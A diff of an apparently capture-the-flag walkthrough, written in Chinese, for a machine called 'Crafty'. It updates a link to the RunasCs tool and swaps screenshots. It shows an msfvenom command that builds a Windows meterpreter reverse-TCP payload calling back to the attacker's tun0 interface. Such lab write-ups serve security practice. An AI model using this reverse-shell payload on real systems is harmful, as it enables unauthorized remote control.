@@ -92,11 +92,14 @@ Crafty Level:Easy
 
     19.找到RunasCs工具
     
-[RunasCs] (https://github.com/antonioCoco/RunasCs)
+[RunasCs] ([https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs/releases))
 
-![圖片](https://github.com/favorite986141/jamescao/assets/125249893/2c95e33c-af3f-4ca2-bc25-cf753b06c891)
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/0b15b409-49bf-48cb-8a41-a521f69537ff)
+
 
     20.使用msfvenom另外建立一個reverse shell
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4246 -f exe -o exp2.exe
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/4392be79-8ed0-4349-b9ff-73f93da94669)
+
+    21.
